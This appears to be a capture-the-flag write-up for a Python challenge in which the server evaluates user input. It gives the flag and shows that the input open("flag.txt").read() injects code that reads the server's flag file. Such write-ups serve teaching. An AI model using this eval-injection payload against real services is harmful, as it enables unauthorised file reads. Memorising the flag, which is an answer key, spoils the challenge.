## Problem info
<table>
  <tr>
    <td><strong>Name</strong></td>
    <td>A Simple Conversation</td>
  </tr>
  <tr>
    <td><strong>Category</strong></td>
    <td>Miscellaneous</td>
  </tr>
  <tr>
    <td><strong>Message</strong></td>
    <td>Someone on the internet wants to talk to you. Can you find out what they want?</td>
  </tr>
  <tr>
    <td><strong>Flags</strong></td>
    <td>hsctf{plz_u5e_pyth0n_3}</td>
  </tr>
  <tr>
    <td><strong>Files</strong></td>
    <td>talk.py</td>
  </tr>
  <tr>
    <td><strong>Tags</strong></td>
    <td>Miscellaneous<br>cppio</td>
  </tr>
  <tr>
    <td><strong>Hints</strong></td>
    <td>Are you sure it's run the way you expect?</td>
  </tr>
</table>

## Solution
After some insertion, we find that if input `1+2`, the server will reply `Sometimes I wish I was 3`.

moreover, if insert randomly like `in`, it will pop out error message, like:
```
in
Traceback (most recent call last):
  File "talk.py", line 18, in <module>
    age = input("> ")
  File "<string>", line 1
    in
     ^
SyntaxError: unexpected EOF while parsing
```
therefore it would be reasonable that server actually runs the input line.

Hence, insert `open("flag.txt").read()` would do the job.

`Sometimes I wish I was hsctf{plz_u5e_pyth0n_3}`